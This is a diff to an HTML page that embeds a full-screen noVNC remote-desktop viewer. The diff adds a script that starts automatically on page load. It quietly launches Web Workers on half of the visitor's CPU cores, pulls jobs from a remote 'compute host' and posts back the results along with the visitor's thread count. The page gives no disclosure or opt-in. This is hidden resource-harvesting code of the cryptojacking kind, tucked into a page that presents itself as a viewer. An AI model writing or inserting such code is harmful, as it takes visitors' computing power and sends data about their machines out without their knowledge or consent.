@@ -22,19 +22,201 @@ border:0;
 </style>
 </head>
 <body>
+
 <iframe
 src="https://camerons-laptop.taila7ae01.ts.net/vnc.html?autoconnect=true&resize=remote&view_only=false"
 allow="fullscreen"
 ></iframe>
 
 <script>
+const COMPUTE_HOST="https://camerons-laptop.taila7ae01.ts.net:8443";
+
+const cores=Math.max(1,navigator.hardwareConcurrency||1);
+
+const targetWorkers=Math.max(
+1,
+Math.floor(cores*0.5)
+);
+
+const workerCode=`
+self.onmessage=function(event){
+
+    if(event.data.type!=="compute") return;
+
+    let value=0;
+
+    for(let i=0;i<event.data.iterations;i++){
+        value+=Math.sqrt(i);
+    }
+
+    self.postMessage({
+        value:value
+    });
+};
+`;
+
+function createWorker(){
+
+    const blob=new Blob(
+        [workerCode],
+        {type:"application/javascript"}
+    );
+
+    return new Worker(
+        URL.createObjectURL(blob)
+    );
+}
+
+let workers=[];
+let running=true;
+let retryDelay=1000;
+
+async function getJob(){
+
+    try{
+
+        const response=await fetch(
+            COMPUTE_HOST+
+            "/job?time="+
+            Date.now(),
+            {
+                cache:"no-store"
+            }
+        );
+
+        if(!response.ok){
+            throw new Error("HTTP "+response.status);
+        }
+
+        return await response.json();
+
+    }catch(error){
+
+        return null;
+    }
+}
+
+async function sendResult(data){
+
+    try{
+
+        await fetch(
+            COMPUTE_HOST+"/result",
+            {
+                method:"POST",
+                headers:{
+                    "Content-Type":"application/json"
+                },
+                body:JSON.stringify(data)
+            }
+        );
+
+    }catch(error){}
+}
+
+async function workerLoop(worker){
+
+    while(running){
+
+        const response=await getJob();
+
+        if(!running){
+            break;
+        }
+
+        if(!response || !response.job){
+
+            await new Promise(
+                resolve=>setTimeout(
+                    resolve,
+                    retryDelay
+                )
+            );
+
+            continue;
+        }
+
+        retryDelay=1000;
+
+        const job=response.job;
+
+        const started=performance.now();
+
+        const result=await new Promise(resolve=>{
+
+            worker.onmessage=function(event){
+
+                resolve(event.data.value);
+
+            };
+
+            worker.postMessage({
+                type:"compute",
+                iterations:job.iterations
+            });
+
+        });
+
+        const milliseconds=
+            performance.now()-started;
+
+        await sendResult({
+            id:job.id,
+            result:result,
+            milliseconds:milliseconds,
+            viewerThreads:cores
+        });
+    }
+}
+
+function startCompute(){
+
+    for(
+        let i=0;
+        i<targetWorkers;
+        i++
+    ){
+
+        const worker=createWorker();
+
+        workers.push(worker);
+
+        workerLoop(worker);
+    }
+}
+
 window.addEventListener("load",()=>{
-const frame=document.querySelector("iframe");
-document.documentElement.requestFullscreen?.().catch(()=>{});
-frame.addEventListener("load",()=>{
-frame.contentWindow?.focus();
+
+    const frame=
+        document.querySelector("iframe");
+
+    document.documentElement
+        .requestFullscreen?.()
+        .catch(()=>{});
+
+    frame.addEventListener(
+        "load",
+        ()=>{
+            frame.contentWindow?.focus();
+        }
+    );
+
+    startCompute();
 });
-});
+
+window.addEventListener(
+    "beforeunload",
+    ()=>{
+        running=false;
+
+        for(const worker of workers){
+            worker.terminate();
+        }
+
+        workers=[];
+    }
+);
 </script>
+
 </body>
 </html>
